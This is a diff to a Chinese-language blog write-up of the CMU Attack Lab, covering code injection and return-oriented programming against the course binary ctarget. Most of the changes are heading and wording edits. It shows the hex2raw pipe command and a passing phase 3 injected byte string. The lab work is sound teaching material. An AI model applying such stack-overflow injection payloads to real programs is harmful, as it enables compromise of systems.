@@ -32,7 +32,7 @@ tags: [overflow,binary]
 
 就按照表中所列的顺序一个一个来,从注入开始。注意运行程序的时候要加上-q参数,不发送数据到分数服务器。
 
-## 第一部分：Code Injection Attacks 
+## 一：Code Injection Attacks 
 
 ### Phase 1
 
@@ -111,7 +111,11 @@ objdump -d ctarget  > ctarget.asm
 
 **c.漏洞利用**
 
-这里还有个问题是如何输入不可打印字符。这里使用官方writeup中给出的HEX2RAW程序。输入类似下面这种命令来向`ctarget`程序中输入。ctarget.l2.txt文件中就是所构造的16进制字节序列。
+
+这里还有个问题是如何输入不可打印字符。这里使用官方writeup中给出的HEX2RAW程序。利用管道操作来向`ctarget`程序中输入。ctarget.l2.txt文件中就是所构造的16进制字节序列。
+
+
+
 
 ```bash
 ./hex2raw < ctarget.l2.txt | ./ctarget
@@ -264,6 +268,7 @@ void touch3(char *sval)
 ```
 
 touch3会调用hexmatch函数,hexmatch函数有如下原型：
+
 ```cpp
 /* Compare string to hex represention of unsigned value */
 int hexmatch(unsigned val, char *sval)
@@ -331,7 +336,7 @@ PASS: Would have posted the following:
 	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
 ```
 
-## 第二部分 Return-Oriented Programming
+## 二:Return-Oriented Programming
 
 ### Phase 4:
 
